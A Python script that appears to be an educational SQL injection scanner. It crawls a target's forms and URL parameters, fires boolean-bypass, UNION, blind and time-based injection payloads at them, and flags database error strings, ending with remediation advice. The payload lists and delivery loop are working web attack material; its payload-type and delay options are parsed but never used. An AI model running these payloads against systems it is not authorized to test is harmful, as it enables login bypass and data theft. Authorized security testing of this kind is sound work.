#!/usr/bin/env python3
"""
SQL Injection Tester - Educational web application vulnerability scanner

This demonstrates how to programmatically test for SQL injection vulnerabilities:
- Form parameter analysis and testing
- Payload generation and delivery
- Response analysis for error patterns
- Safe vulnerability confirmation

WARNING: Only use on applications you own or have permission to test.

Usage: python sql_injection_tester.py <target_url> [options]
Example: python sql_injection_tester.py http://example.com/login.php
"""

import requests
import sys
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import argparse

class SQLInjectionTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
        # Set realistic headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # SQL injection payloads categorized by technique
        self.payloads = {
            'basic': [
                "'", '"', '`',  # Basic quote tests
                "' OR '1'='1", '" OR "1"="1',  # Basic boolean bypass
                "' OR '1'='1' --", '" OR "1"="1" --',  # Comment bypass
                "admin'--", 'admin"--',  # Username bypass
                "' OR 1=1#", '" OR 1=1#'  # Hash comment bypass
            ],
            'union': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION ALL SELECT NULL--"
            ],
            'blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SUBSTRING(@@version,1,1)='5'--",
                "' AND LENGTH(database())>0--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR SLEEP(5)--",
                "'; SELECT pg_sleep(5)--"
            ]
        }
        
        # Database error patterns for different DBMS
        self.error_patterns = {
            'mysql': [
                'mysql_fetch_array', 'mysql_fetch_assoc', 'mysql_fetch_row',
                'mysql_num_rows', 'mysql_error', 'warning: mysql',
                'function.mysql', 'mysql result', 'mysqlclient'
            ],
            'postgresql': [
                'postgresql', 'postgres', 'pg_query', 'pg_exec',
                'pg_connect', 'function.pg', 'warning: pg_'
            ],
            'mssql': [
                'microsoft sql server', 'sqlserver', 'mssql',
                'microsoft jet database', 'sql server'
            ],
            'oracle': [
                'ora-', 'oracle error', 'oracle driver',
                'warning: oci_', 'function.oci'
            ],
            'sqlite': [
                'sqlite_query', 'sqlite_fetch', 'sqlite_open',
                'function.sqlite', 'sqlite3::query'
            ],
            'generic': [
                'sql syntax', 'sql error', 'database error',
                'syntax error', 'unexpected end of sql command',
                'warning: cannot modify header', 'division by zero'
            ]
        }
    
    def extract_forms(self, url):
        """
        Extract all forms from a webpage for testing
        
        Args:
            url (str): URL to extract forms from
            
        Returns:
            list: List of form dictionaries
        """
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            forms = []
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'url': url,
                    'inputs': []
                }
                
                # Extract all input fields
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', ''),
                        'required': input_tag.has_attr('required')
                    }
                    
                    if input_data['name']:  # Only include named inputs
                        form_data['inputs'].append(input_data)
                
                if form_data['inputs']:  # Only include forms with inputs
                    forms.append(form_data)
            
            return forms
            
        except Exception as e:
            print(f"[!] Error extracting forms from {url}: {e}")
            return []
    
    def test_parameter(self, form_data, parameter, payload_category='basic'):
        """
        Test a specific parameter with SQL injection payloads
        
        Args:
            form_data (dict): Form information
            parameter (dict): Parameter to test
            payload_category (str): Category of payloads to use
            
        Returns:
            list: List of potential vulnerabilities found
        """
        vulnerabilities = []
        payloads = self.payloads.get(payload_category, self.payloads['basic'])
        
        print(f"[*] Testing parameter '{parameter['name']}' with {len(payloads)} payloads...")
        
        for payload in payloads:
            # Prepare form data
            form_params = {}
            for input_field in form_data['inputs']:
                if input_field['name'] == parameter['name']:
                    # Inject payload into target parameter
                    form_params[input_field['name']] = payload
                else:
                    # Use default values for other fields
                    if input_field['type'] == 'email':
                        form_params[input_field['name']] = 'test@example.com'
                    elif input_field['type'] == 'password':
                        form_params[input_field['name']] = 'password123'
                    elif input_field['type'] in ['text', 'search']:
                        form_params[input_field['name']] = 'test'
                    else:
                        form_params[input_field['name']] = input_field.get('value', 'test')
            
            # Send request
            try:
                target_url = urljoin(form_data['url'], form_data['action'])
                
                if form_data['method'] == 'post':
                    response = self.session.post(target_url, data=form_params, timeout=10)
                else:
                    response = self.session.get(target_url, params=form_params, timeout=10)
                
                # Analyze response for SQL errors
                vulnerability = self.analyze_response(response, payload, parameter['name'])
                if vulnerability:
                    vulnerabilities.append(vulnerability)
                    print(f"[!] POTENTIAL VULNERABILITY FOUND!")
                    print(f"    Parameter: {parameter['name']}")
                    print(f"    Payload: {payload}")
                    print(f"    Evidence: {vulnerability['evidence']}")
                
            except Exception as e:
                print(f"[!] Error testing payload '{payload}': {e}")
            
            # Be respectful with timing
            time.sleep(0.2)
        
        return vulnerabilities
    
    def analyze_response(self, response, payload, parameter):
        """
        Analyze HTTP response for SQL injection indicators
        
        Args:
            response: HTTP response object
            payload (str): Payload that was sent
            parameter (str): Parameter name tested
            
        Returns:
            dict: Vulnerability information if found, None otherwise
        """
        response_text = response.text.lower()
        
        # Check for database error patterns
        for dbms, patterns in self.error_patterns.items():
            for pattern in patterns:
                if pattern in response_text:
                    return {
                        'type': 'SQL Injection',
                        'severity': 'High',
                        'parameter': parameter,
                        'payload': payload,
                        'evidence': pattern,
                        'dbms': dbms,
                        'response_code': response.status_code,
                        'url': response.url
                    }
        
        # Check for unusual response patterns
        if len(response.text) == 0 and response.status_code == 200:
            return {
                'type': 'Possible SQL Injection (Empty Response)',
                'severity': 'Medium',
                'parameter': parameter,
                'payload': payload,
                'evidence': 'Empty response with 200 status',
                'response_code': response.status_code,
                'url': response.url
            }
        
        # Check for HTTP error codes that might indicate injection
        if response.status_code == 500:
            return {
                'type': 'Possible SQL Injection (Server Error)',
                'severity': 'Medium',
                'parameter': parameter,
                'payload': payload,
                'evidence': 'HTTP 500 Internal Server Error',
                'response_code': response.status_code,
                'url': response.url
            }
        
        return None
    
    def test_url_parameters(self, url):
        """
        Test URL parameters for SQL injection
        
        Args:
            url (str): URL with parameters to test
        """
        parsed_url = urlparse(url)
        if not parsed_url.query:
            print("[*] No URL parameters found to test")
            return []
        
        print(f"[*] Testing URL parameters in: {url}")
        vulnerabilities = []
        
        # Parse existing parameters
        from urllib.parse import parse_qs
        params = parse_qs(parsed_url.query)
        
        for param_name, param_values in params.items():
            print(f"[*] Testing URL parameter: {param_name}")
            
            for payload in self.payloads['basic']:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                # Reconstruct URL with payload
                from urllib.parse import urlencode
                query_string = urlencode(test_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    vulnerability = self.analyze_response(response, payload, param_name)
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        print(f"[!] POTENTIAL VULNERABILITY in URL parameter!")
                        print(f"    Parameter: {param_name}")
                        print(f"    Payload: {payload}")
                        
                except Exception as e:
                    print(f"[!] Error testing URL parameter: {e}")
                
                time.sleep(0.2)
        
        return vulnerabilities
    
    def run_comprehensive_test(self):
        """
        Run comprehensive SQL injection testing
        
        Returns:
            dict: Complete test results
        """
        print(f"[*] Starting comprehensive SQL injection test on: {self.target_url}")
        print("-" * 70)
        
        all_vulnerabilities = []
        
        # Test 1: Extract and test forms
        print("\n=== Testing Form Parameters ===")
        forms = self.extract_forms(self.target_url)
        
        if forms:
            print(f"[+] Found {len(forms)} forms to test")
            
            for i, form in enumerate(forms, 1):
                print(f"\n[*] Testing Form {i}: {form['method'].upper()} {form['action']}")
                
                for param in form['inputs']:
                    if param['type'] not in ['submit', 'button', 'hidden']:
                        vulnerabilities = self.test_parameter(form, param)
                        all_vulnerabilities.extend(vulnerabilities)
        else:
            print("[*] No forms found on the page")
        
        # Test 2: URL parameters
        print("\n=== Testing URL Parameters ===")
        url_vulns = self.test_url_parameters(self.target_url)
        all_vulnerabilities.extend(url_vulns)
        
        # Generate report
        self.generate_report(all_vulnerabilities)
        
        return {
            'total_vulnerabilities': len(all_vulnerabilities),
            'vulnerabilities': all_vulnerabilities,
            'forms_tested': len(forms),
            'target_url': self.target_url
        }
    
    def generate_report(self, vulnerabilities):
        """
        Generate and display test report
        
        Args:
            vulnerabilities (list): List of found vulnerabilities
        """
        print("\n" + "=" * 70)
        print("SQL INJECTION TEST REPORT")
        print("=" * 70)
        
        if vulnerabilities:
            print(f"[!] FOUND {len(vulnerabilities)} POTENTIAL VULNERABILITIES")
            print()
            
            # Group by severity
            severity_groups = {}
            for vuln in vulnerabilities:
                severity = vuln.get('severity', 'Unknown')
                if severity not in severity_groups:
                    severity_groups[severity] = []
                severity_groups[severity].append(vuln)
            
            for severity in ['Critical', 'High', 'Medium', 'Low']:
                if severity in severity_groups:
                    print(f"{severity.upper()} SEVERITY ({len(severity_groups[severity])} issues):")
                    for vuln in severity_groups[severity]:
                        print(f"  • {vuln['type']} in parameter '{vuln['parameter']}'")
                        print(f"    Payload: {vuln['payload']}")
                        print(f"    Evidence: {vuln['evidence']}")
                        if 'dbms' in vuln:
                            print(f"    Detected DBMS: {vuln['dbms'].upper()}")
                        print()
            
            print("RECOMMENDATIONS:")
            print("• Use parameterized queries/prepared statements")
            print("• Implement input validation and sanitization")
            print("• Apply principle of least privilege to database accounts")
            print("• Use web application firewalls (WAF)")
            print("• Regular security testing and code reviews")
            
        else:
            print("[+] No SQL injection vulnerabilities detected")
            print("    Note: This doesn't guarantee the application is secure")
            print("    Consider manual testing and code review")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Educational SQL Injection Tester')
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('--payload-type', choices=['basic', 'union', 'blind', 'time_based'],
                       default='basic', help='Type of payloads to use')
    parser.add_argument('--delay', type=float, default=0.2,
                       help='Delay between requests (seconds)')
    
    args = parser.parse_args()
    
    # Validate URL
    parsed_url = urlparse(args.url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print("[!] Invalid URL format. Include http:// or https://")
        sys.exit(1)
    
    # Ethical warning
    print("=" * 70)
    print("EDUCATIONAL SQL INJECTION TESTER")
    print("=" * 70)
    print("WARNING: Only test applications you own or have permission to test!")
    print("Unauthorized testing may be illegal in your jurisdiction.")
    print()
    print("This tool is for educational purposes and authorized security testing only.")
    print("=" * 70)
    
    try:
        # Create tester and run tests
        tester = SQLInjectionTester(args.url)
        results = tester.run_comprehensive_test()
        
        # Summary
        print(f"\nTesting completed:")
        print(f"• Target: {args.url}")
        print(f"• Forms tested: {results['forms_tested']}")
        print(f"• Vulnerabilities found: {results['total_vulnerabilities']}")
        
    except KeyboardInterrupt:
        print("\n[!] Testing interrupted by user")
    except Exception as e:
        print(f"[!] Testing error: {e}")

if __name__ == "__main__":
    main()